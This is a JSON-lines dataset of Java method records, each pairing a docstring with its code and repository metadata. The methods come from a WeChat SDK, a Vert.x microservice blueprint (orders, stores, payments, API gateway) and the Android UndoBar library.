{"docstring": "/**\n * \u83b7\u53d6\u5ba2\u6237\u7684\u4f1a\u8bdd\u72b6\u6001 \n * @param openId\n * @return\n */\n", "func_signal": "public CustomerServicesSession getSession(String openId)", "code": "{\n\tString resultStr = HttpUtils.get(CUSTOMSERVICE_KFSESSION_GETSESSION_GET_URL+this.accessToken+\"&openid=\"+openId);\n\ttry {\n\t\tWeChatUtil.isSuccess(resultStr);\n\t} catch (WeChatException e) {\n\t\tlogger.error(e.getMessage());\n\t\te.printStackTrace();\n\t\treturn null;\n\t}\n\tCustomerServicesSession customerServicesSession = JSON.parseObject(resultStr, CustomerServicesSession.class);\n\treturn customerServicesSession;\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "//    @Test\n", "func_signal": "public void testReport() throws SignatureException, PayApiException, PayBusinessException", "code": "{\n        ReportRequest reportRequest = new ReportRequest();\n        reportRequest.setNonce_str(RandomStringGenerator.generate());\n        reportRequest.setInterface_url(\"https://api.mch.weixin.qq.com/pay/unifiedorder\");\n        reportRequest.setExecute_time_(1000);\n        reportRequest.setReturn_code(PayCode.SUCCESS.toString());\n        reportRequest.setReturn_msg(\"\u6210\u529f\");\n        reportRequest.setResult_code(PayCode.SUCCESS.toString());\n        reportRequest.setOut_trade_no(RandomStringGenerator.generate());\n        reportRequest.setUser_ip(\"127.0.0.1\");\n        reportRequest.setTime(\"201512130235\");\n        ReportResponse reportResponse = PayManager.report(reportRequest);\n        System.out.println(reportResponse);\n    }", "path": "test\\org\\sword\\wechat4j\\pay\\PayTest.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u68c0\u9a8c\u6388\u6743\u51ed\u8bc1\uff08access_token\uff09\u662f\u5426\u6709\u6548\n * <p>\u53c2\u8003<a href=\"http://mp.weixin.qq.com/wiki/17/c0f37d5704f0b64713d5d2c37b468d75.html#.E9.99.84.EF.BC.9A.E6.A3.80.E9.AA.8C.E6.8E.88.E6.9D.83.E5.87.AD.E8.AF.81.EF.BC.88access_token.EF.BC.89.E6.98.AF.E5.90.A6.E6.9C.89.E6.95.88\">\u5f00\u53d1\u6587\u6863</a></p>\n *\n * @param request\n * @return\n */\n", "func_signal": "public static ValidAccessTokenResponse validAccessToken(ValidAccessTokenRequest request) throws OAuthException", "code": "{\n    String response = post(HTTPS_API_WEIXIN_QQ_COM_SNS_AUTH, request);\n    check(response);\n    return JSONObject.parseObject(response, ValidAccessTokenResponse.class);\n}", "path": "src\\org\\sword\\wechat4j\\oauth\\OAuthManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u83b7\u53d6\u5ba2\u670d\u804a\u5929\u8bb0\u5f55\n * @param starttime \u67e5\u8be2\u5f00\u59cb\u65f6\u95f4\uff0cUNIX\u65f6\u95f4\u6233\n * @param endtime \u67e5\u8be2\u7ed3\u675f\u65f6\u95f4\uff0cUNIX\u65f6\u95f4\u6233\uff0c\u6bcf\u6b21\u67e5\u8be2\u4e0d\u80fd\u8de8\u65e5\u67e5\u8be2\n * @param pageindex \u67e5\u8be2\u7b2c\u51e0\u9875\uff0c\u4ece1\u5f00\u59cb\n * @param pagesize \u6bcf\u9875\u5927\u5c0f\uff0c\u6bcf\u9875\u6700\u591a\u62c9\u53d650\u6761\n * @return\n */\n", "func_signal": "public List<Record> getRecord(long starttime,long endtime, int pageindex,int pagesize)", "code": "{\n\tJSONObject data = new JSONObject();\n\tdata.put(\"endtime\", endtime);\n\tdata.put(\"pageindex\", pageindex);\n\tdata.put(\"pagesize\", pagesize);\n\tdata.put(\"starttime\", starttime);\n\tString resultStr = HttpUtils.post(CUSTOMSERVICE_MSGRECORD_GETRECORD_POST_URL+this.accessToken, data.toJSONString());\n\ttry {\n\t\tWeChatUtil.isSuccess(resultStr);\n\t} catch (WeChatException e) {\n\t\tlogger.error(e.getMessage());\n\t\te.printStackTrace();\n\t\treturn null;\n\t}\n\tString recordlist = JSON.parseObject(resultStr).getString(\"recordlist\");\n\tList<Record> records = JSON.parseArray(recordlist, Record.class);\n\treturn records;\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u83b7\u53d6\u6240\u6709\u5ba2\u670d\u8d26\u53f7\t\n * @return\n */\n", "func_signal": "public List<CustomerServices> getKfList()", "code": "{\n\tString resultStr = HttpUtils.get(CUSTOMSERVICE_GETKFLIST_GET_URL+this.accessToken);\n\ttry {\n\t\tWeChatUtil.isSuccess(resultStr);\n\t} catch (WeChatException e) {\n\t\tlogger.error(e.getMessage());\n\t\te.printStackTrace();\n\t\treturn null;\n\t}\n\tString kf_list = JSONObject.parseObject(resultStr).getString(\"kf_list\");\n\tList<CustomerServices> list = JSON.parseArray(kf_list,  CustomerServices.class);\n\treturn list;\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * Retrieve the order with a certain <code>orderId</code>.\n * @param orderId order id\n * @return \n */\n", "func_signal": "public Single<Order> rxRetrieveOrder(Long orderId)", "code": "{ \n  return Single.create(new io.vertx.rx.java.SingleOnSubscribeAdapter<>(fut -> {\n    retrieveOrder(orderId, fut);\n  }));\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "// log methods\n", "func_signal": "private void publishGatewayLog(String info)", "code": "{\n  JsonObject message = new JsonObject()\n    .put(\"info\", info)\n    .put(\"time\", System.currentTimeMillis());\n  publishLogEvent(\"gateway\", message);\n}", "path": "api-gateway\\src\\main\\java\\io\\vertx\\blueprint\\microservice\\gateway\\APIGatewayVerticle.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Initialize the persistence.\n * @param resultHandler async result handler\n * @return \n */\n", "func_signal": "public OrderService initializePersistence(Handler<AsyncResult<Void>> resultHandler)", "code": "{ \n  delegate.initializePersistence(resultHandler);\n  return this;\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Save an online store to the persistence layer. This is a so called `upsert` operation.\n * This is used to update store info, or just apply for a new store.\n * @param store store object\n * @return \n */\n", "func_signal": "public Single<Void> rxSaveStore(Store store)", "code": "{ \n  return Single.create(new io.vertx.rx.java.SingleOnSubscribeAdapter<>(fut -> {\n    saveStore(store, fut);\n  }));\n}", "path": "store-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\store\\rxjava\\StoreCRUDService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Retrieve payment record from backend by payment id.\n * @param payId payment id\n * @return \n */\n", "func_signal": "public Observable<Payment> retrievePaymentRecordObservable(String payId)", "code": "{ \n  io.vertx.rx.java.ObservableFuture<Payment> resultHandler = io.vertx.rx.java.RxHelper.observableFuture();\n  retrievePaymentRecord(payId, resultHandler.toHandler());\n  return resultHandler;\n}", "path": "payment-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\payment\\rxjava\\PaymentQueryService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Retrieve orders belonging to a certain account.\n * @param accountId account id\n * @return \n */\n", "func_signal": "public Single<List<Order>> rxRetrieveOrdersForAccount(String accountId)", "code": "{ \n  return Single.create(new io.vertx.rx.java.SingleOnSubscribeAdapter<>(fut -> {\n    retrieveOrdersForAccount(accountId, fut);\n  }));\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/*\").handler(this::dispatchRequests);\n\n    // static content\n    router.route(\"/*\").handler(StaticHandler.create());\n\n    // enable HTTPS\n    HttpServerOptions httpServerOptions = new HttpServerOptions()\n      .setSsl(true)\n      .setKeyStoreOptions(new JksOptions().setPath(\"server.jks\").setPassword(\"123456\"));\n\n    // create http server\n    vertx.createHttpServer(httpServerOptions)\n      .requestHandler(router::accept)\n      .listen(port, host, ar -> {\n        if (ar.succeeded()) {\n          publishApiGateway(host, port);\n          future.complete();\n          logger.info(\"API Gateway is running on port \" + port);\n          // publish log\n          publishGatewayLog(\"api_gateway_init_success:\" + port);\n        } else {\n          future.fail(ar.cause());\n        }\n      });\n  }\n\n  private void dispatchRequests(RoutingContext context) {\n    int initialOffset = 5; // length of `/api/`\n    // run with circuit breaker in order to deal with failure\n    circuitBreaker.execute(future -> {\n      getAllEndpoints().setHandler(ar -> {\n        if (ar.succeeded()) {\n          List<Record> recordList = ar.result();\n          // get relative path and retrieve prefix to dispatch client\n          String path = context.request().uri();\n\n          if (path.length() <= initialOffset) {\n            notFound(context);\n            future.complete();\n            return;\n          }\n          String prefix = (path.substring(initialOffset)\n            .split(\"/\"))[0];\n          // generate new relative path\n          String newPath = path.substring(initialOffset + prefix.length());\n          // get one relevant HTTP client, may not exist\n          Optional<Record> client = recordList.stream()\n            .filter(record -> record.getMetadata().getString(\"api.name\") != null)\n            .filter(record -> record.getMetadata().getString(\"api.name\").equals(prefix))\n            .findAny(); // simple load balance\n\n          if (client.isPresent()) {\n            doDispatch(context, newPath, discovery.getReference(client.get()).get(), future);\n          } else {\n            notFound(context);\n            future.complete();\n          }\n        } else {\n          future.fail(ar.cause());\n        }\n      });\n    }).setHandler(ar -> {\n      if (ar.failed()) {\n        badGateway(ar.cause(), context);\n      }\n    });\n  }\n\n  /**\n   * Dispatch the request to the downstream REST layers.\n   *\n   * @param context routing context instance\n   * @param path    relative path\n   * @param client  relevant HTTP client\n   */\n", "func_signal": "private void doDispatch(RoutingContext context, String path, HttpClient client, Future<Object> cbFuture)", "code": "{\n    HttpClientRequest toReq = client\n      .request(context.request().method(), path, response -> {\n        response.bodyHandler(body -> {\n          if (response.statusCode() >= 500) { // api endpoint server error, circuit breaker should fail\n            cbFuture.fail(response.statusCode() + \": \" + body.toString());\n          } else {\n            HttpServerResponse toRsp = context.response()\n              .setStatusCode(response.statusCode());\n            response.headers().forEach(header -> {\n              toRsp.putHeader(header.getKey(), header.getValue());\n            });\n            // send response\n            toRsp.end(body);\n            cbFuture.complete();\n          }\n          ServiceDiscovery.releaseServiceObject(discovery, client);\n        });\n      });\n    // set headers\n    context.request().headers().forEach(header -> {\n      toReq.putHeader(header.getKey(), header.getValue());\n    });\n    if (context.user() != null) {\n      toReq.putHeader(\"user-principal\", context.user().principal().encode());\n    }\n    // send request\n    if (context.getBody() == null) {\n      toReq.end();\n    } else {\n      toReq.end(context.getBody());\n    }\n  }", "path": "api-gateway\\src\\main\\java\\io\\vertx\\blueprint\\microservice\\gateway\\APIGatewayVerticle.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Initialize the persistence.\n * @return \n */\n", "func_signal": "public Single<Void> rxInitializePersistence()", "code": "{ \n  return Single.create(new io.vertx.rx.java.SingleOnSubscribeAdapter<>(fut -> {\n    initializePersistence(fut);\n  }));\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Retrieve orders belonging to a certain account.\n * @param accountId account id\n * @param resultHandler async result handler\n * @return \n */\n", "func_signal": "public OrderService retrieveOrdersForAccount(String accountId, Handler<AsyncResult<List<Order>>> resultHandler)", "code": "{ \n  delegate.retrieveOrdersForAccount(accountId, resultHandler);\n  return this;\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "// auth\n", "func_signal": "private void authCallback(OAuth2Auth oauth2, String hostURL, RoutingContext context)", "code": "{\n  final String code = context.request().getParam(\"code\");\n  // code is a require value\n  if (code == null) {\n    context.fail(400);\n    return;\n  }\n  final String redirectTo = context.request().getParam(\"redirect_uri\");\n  final String redirectURI = hostURL + context.currentRoute().getPath() + \"?redirect_uri=\" + redirectTo;\n  oauth2.getToken(new JsonObject().put(\"code\", code).put(\"redirect_uri\", redirectURI), ar -> {\n    if (ar.failed()) {\n      logger.warn(\"Auth fail\");\n      context.fail(ar.cause());\n    } else {\n      logger.info(\"Auth success\");\n      context.setUser(ar.result());\n      context.response()\n        .putHeader(\"Location\", redirectTo)\n        .setStatusCode(302)\n        .end();\n    }\n  });\n}", "path": "api-gateway\\src\\main\\java\\io\\vertx\\blueprint\\microservice\\gateway\\APIGatewayVerticle.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Apply inventory decrease changes according to the order.\n *\n * @param order order data object\n * @return async result\n */\n", "func_signal": "private Future<Void> applyInventoryChanges(Order order)", "code": "{\n  Future<Void> future = Future.future();\n  // get REST endpoint\n  Future<HttpClient> clientFuture = Future.future();\n  HttpEndpoint.getClient(discovery,\n    new JsonObject().put(\"name\", \"inventory-rest-api\"),\n    clientFuture.completer());\n  // modify the inventory changes via REST API\n  return clientFuture.compose(client -> {\n    List<Future> futures = order.getProducts()\n      .stream()\n      .map(item -> {\n        Future<Void> resultFuture = Future.future();\n        String url = String.format(\"/%s/decrease?n=%d\", item.getProductId(), item.getAmount());\n        client.put(url, response -> {\n          if (response.statusCode() == 200) {\n            resultFuture.complete(); // need to check result?\n          } else {\n            resultFuture.fail(response.statusMessage());\n          }\n        })\n          .exceptionHandler(resultFuture::fail)\n          .end();\n        return resultFuture;\n      })\n      .collect(Collectors.toList());\n    // composite async results, all must be complete\n    CompositeFuture.all(futures).setHandler(ar -> {\n      if (ar.succeeded()) {\n        future.complete();\n      } else {\n        future.fail(ar.cause());\n      }\n      ServiceDiscovery.releaseServiceObject(discovery, client); // Release the resources.\n    });\n    return future;\n  });\n}", "path": "order-microservice\\src\\main\\java\\io\\vertx\\blueprint\\microservice\\order\\RawOrderDispatcher.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Wrap raw order and generate new order.\n *\n * @return the new order.\n */\n", "func_signal": "private Order wrapRawOrder(JsonObject rawOrder)", "code": "{\n  return new Order(rawOrder)\n    .setCreateTime(System.currentTimeMillis());\n}", "path": "order-microservice\\src\\main\\java\\io\\vertx\\blueprint\\microservice\\order\\RawOrderDispatcher.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Save an order into the persistence.\n * @param order order data object\n * @param resultHandler async result handler\n * @return \n */\n", "func_signal": "public OrderService createOrder(Order order, Handler<AsyncResult<Void>> resultHandler)", "code": "{ \n  delegate.createOrder(order, resultHandler);\n  return this;\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Save an order into the persistence.\n * @param order order data object\n * @return \n */\n", "func_signal": "public Single<Void> rxCreateOrder(Order order)", "code": "{ \n  return Single.create(new io.vertx.rx.java.SingleOnSubscribeAdapter<>(fut -> {\n    createOrder(order, fut);\n  }));\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Remove an online store whose seller is <code>sellerId</code>.\n * This is used to close an online store.\n * @param sellerId seller id, refers to an independent online store\n * @return \n */\n", "func_signal": "public Single<Void> rxRemoveStore(String sellerId)", "code": "{ \n  return Single.create(new io.vertx.rx.java.SingleOnSubscribeAdapter<>(fut -> {\n    removeStore(sellerId, fut);\n  }));\n}", "path": "store-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\store\\rxjava\\StoreCRUDService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Add a payment record into the backend persistence.\n * @param payment payment entity\n * @return \n */\n", "func_signal": "public Observable<Void> addPaymentRecordObservable(Payment payment)", "code": "{ \n  io.vertx.rx.java.ObservableFuture<Void> resultHandler = io.vertx.rx.java.RxHelper.observableFuture();\n  addPaymentRecord(payment, resultHandler.toHandler());\n  return resultHandler;\n}", "path": "payment-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\payment\\rxjava\\PaymentQueryService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Get all REST endpoints from the service discovery infrastructure.\n *\n * @return async result\n */\n", "func_signal": "private Future<List<Record>> getAllEndpoints()", "code": "{\n  Future<List<Record>> future = Future.future();\n  discovery.getRecords(record -> record.getType().equals(HttpEndpoint.TYPE),\n    future.completer());\n  return future;\n}", "path": "api-gateway\\src\\main\\java\\io\\vertx\\blueprint\\microservice\\gateway\\APIGatewayVerticle.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Retrieve the order with a certain <code>orderId</code>.\n * @param orderId order id\n * @param resultHandler async result handler\n * @return \n */\n", "func_signal": "public OrderService retrieveOrder(Long orderId, Handler<AsyncResult<Order>> resultHandler)", "code": "{ \n  delegate.retrieveOrder(orderId, resultHandler);\n  return this;\n}", "path": "order-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\order\\rxjava\\OrderService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Dispatch the order to the infrastructure layer.\n * Here we simply save the order to the persistence and modify inventory changes.\n *\n * @param order  order data object\n * @param sender message sender\n */\n", "func_signal": "private void dispatchOrder(Order order, Message<JsonObject> sender)", "code": "{\n  Future<Void> orderCreateFuture = Future.future();\n  orderService.createOrder(order, orderCreateFuture.completer());\n  orderCreateFuture\n    .compose(orderCreated -> applyInventoryChanges(order))\n    .setHandler(ar -> {\n      if (ar.succeeded()) {\n        CheckoutResult result = new CheckoutResult(\"checkout_success\", order);\n        sender.reply(result.toJson());\n        publishLogEvent(\"checkout\", result.toJson(), true);\n      } else {\n        sender.fail(5000, ar.cause().getMessage());\n        ar.cause().printStackTrace();\n      }\n    });\n}", "path": "order-microservice\\src\\main\\java\\io\\vertx\\blueprint\\microservice\\order\\RawOrderDispatcher.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Retrieve an online store by seller id.\n * @param sellerId seller id, refers to an independent online store\n * @return \n */\n", "func_signal": "public Single<Store> rxRetrieveStore(String sellerId)", "code": "{ \n  return Single.create(new io.vertx.rx.java.SingleOnSubscribeAdapter<>(fut -> {\n    retrieveStore(sellerId, fut);\n  }));\n}", "path": "store-microservice\\src\\main\\generated\\io\\vertx\\blueprint\\microservice\\store\\rxjava\\StoreCRUDService.java", "repo_name": "sczyh30/vertx-blueprint-microservice", "stars": 749, "license": "apache-2.0", "language": "java", "size": 1877}
{"docstring": "/**\n * Sets the message to be displayed on the left of the undo bar.\n */\n", "func_signal": "public Builder setMessage(int messageResId)", "code": "{\n    mUndoMessage = mWindow.getContext().getString(messageResId);\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * If set to {@code true}, the undo bar will appear stuck at the bottom without any margins.<br>\n * The default is {@code false}.<br>\n * <b>Note:</b> This is only applied to the {@link UndoBar.Style#LOLLIPOP}\n * style on devices with a smallest width of less than 600dp and ignored otherwise.\n */\n", "func_signal": "public Builder setAlignParentBottom(boolean alignParentBottom)", "code": "{\n    mAlignParentBottom = alignParentBottom;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Forces the style of the undo bar to match a certain API level.<br>\n * By default, it uses the style of the device's current API level.\n * <p/>\n * This is useful, for example, if you want to show a consistent\n * Lollipop style across all API levels.\n */\n", "func_signal": "public Builder setStyle(Style style)", "code": "{\n    mStyle = style;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Sets the text color of the undo button.<br>\n * The default color is white.<br>\n * <b>Note:</b> This is only applied to the {@link UndoBar.Style#LOLLIPOP}\n * style and ignored otherwise.\n */\n", "func_signal": "public Builder setUndoColor(int undoColor)", "code": "{\n    mUndoColor = undoColor;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Performs the actual hide animation.\n */\n", "func_signal": "protected void animateOut()", "code": "{\n    mViewCompat.animateOut(mAnimationDuration, new ViewCompat.AnimatorListener() {\n        @Override\n        public void onAnimationEnd() {\n            mView.setVisibility(View.GONE);\n            mUndoMessage = null;\n            mUndoToken = null;\n        }\n    });\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Notifies listener if available.\n */\n", "func_signal": "protected void safelyNotifyOnHide()", "code": "{\n    if (mUndoListener != null) {\n        mUndoListener.onHide();\n    }\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Notifies listener if available.\n */\n", "func_signal": "protected void safelyNotifyOnUndo()", "code": "{\n    if (mUndoListener != null) {\n        mUndoListener.onUndo(mUndoToken);\n    }\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Hides the {@link UndoBar}.\n *\n * @param shouldAnimate whether the {@link UndoBar} should animate out\n */\n", "func_signal": "public void hide(boolean shouldAnimate)", "code": "{\n    mHandler.removeCallbacks(mHideRunnable);\n\n    if (shouldAnimate) {\n        animateOut();\n    } else {\n        mViewCompat.setAlpha(0);\n        mView.setVisibility(View.GONE);\n        mUndoMessage = null;\n        mUndoToken = null;\n    }\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Shows the {@link UndoBar}.\n *\n * @param shouldAnimate whether the {@link UndoBar} should animate in\n */\n", "func_signal": "public void show(boolean shouldAnimate)", "code": "{\n    mView.setMessage(mUndoMessage);\n    mView.setButtonLabel(mUseEnglishLocale ? R.string.undo_english : R.string.undo);\n    if (isLollipopStyle(mStyle)) {\n        mView.setUndoColor(mUndoColor);\n        if (mAlignParentBottom && isAlignBottomPossible()) {\n            removeMargins(mView);\n        }\n    }\n\n    mHandler.removeCallbacks(mHideRunnable);\n    mHandler.postDelayed(mHideRunnable, mDuration);\n\n    mView.setVisibility(View.VISIBLE);\n    if (shouldAnimate) {\n        animateIn();\n    } else {\n        mViewCompat.setAlpha(1);\n    }\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Sets the {@link Listener UndoBar.Listener}.\n */\n", "func_signal": "public Builder setListener(Listener undoListener)", "code": "{\n    mUndoListener = undoListener;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Sets the duration the undo bar will be shown.<br>\n * Default is {@link #DEFAULT_DURATION}.\n *\n * @param duration in milliseconds\n */\n", "func_signal": "public Builder setDuration(int duration)", "code": "{\n    mDuration = duration;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Checks if there is already an {@link UndoBarView} instance added to the\n * given {@link Window}.<br>\n * If {@code true}, returns that instance.<br>\n * If {@code false}, inflates a new {@link UndoBarView} and returns it.\n */\n", "func_signal": "protected UndoBarView getView(Window window)", "code": "{\n    ViewGroup decorView = (ViewGroup) window.getDecorView();\n\n    // if we're operating within an Activity, limit ourselves to the content view.\n    ViewGroup rootView = (ViewGroup) decorView.findViewById(android.R.id.content);\n    if (rootView == null) {\n        rootView = decorView;\n    }\n\n    // if it's the first undo bar in this window or a different style, inflate a new instance\n    UndoBarView undoBarView = (UndoBarView) rootView.findViewById(R.id.undoBar);\n    if (undoBarView == null || undoBarView.getTag() != mStyle) {\n        rootView.removeView(undoBarView); // remove potential undo bar w/ different style\n        undoBarView = (UndoBarView) LayoutInflater.from(rootView.getContext())\n                .inflate(mStyle.getLayoutResId(), rootView, false);\n        undoBarView.setTag(mStyle);\n        rootView.addView(undoBarView);\n    }\n\n    return undoBarView;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Forces the English {@link java.util.Locale Locale} to be used explicitly.<br>\n * This means that the undo bar label will always show <b>UNDO</b>\n * regardless of the device's current {@link java.util.Locale Locale}.\n */\n", "func_signal": "public Builder setUseEnglishLocale(boolean useEnglishLocale)", "code": "{\n    mUseEnglishLocale = useEnglishLocale;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Sets a {@link Parcelable} token to the undo bar which will be\n * returned in the {@link Listener UndoBar.Listener}.\n */\n", "func_signal": "public Builder setUndoToken(Parcelable undoToken)", "code": "{\n    mUndoToken = undoToken;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Sets the duration of the animation for showing and hiding the undo\n * bar.<br>\n * Default is {@link #DEFAULT_ANIMATION_DURATION}.\n *\n * @param animationDuration in milliseconds\n */\n", "func_signal": "public Builder setAnimationDuration(int animationDuration)", "code": "{\n    mAnimationDuration = animationDuration;\n    return this;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Called when the undo bar disappears without being actioned.<br>\n * Hides the undo bar and notifies potential listener.\n */\n", "func_signal": "protected void onHide()", "code": "{\n    hide(true);\n    safelyNotifyOnHide();\n    mUndoListener = null;\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
{"docstring": "/**\n * Removes any margins from the given view.\n */\n", "func_signal": "private static void removeMargins(View view)", "code": "{\n    ViewGroup.MarginLayoutParams layoutParams = (ViewGroup.MarginLayoutParams) view.getLayoutParams();\n    layoutParams.leftMargin = layoutParams.topMargin = layoutParams.rightMargin = layoutParams.bottomMargin = 0;\n    view.setLayoutParams(layoutParams);\n}", "path": "library\\src\\main\\java\\com\\jensdriller\\libs\\undobar\\UndoBar.java", "repo_name": "jenzz/Android-UndoBar", "stars": 583, "license": "mit", "language": "java", "size": 856}
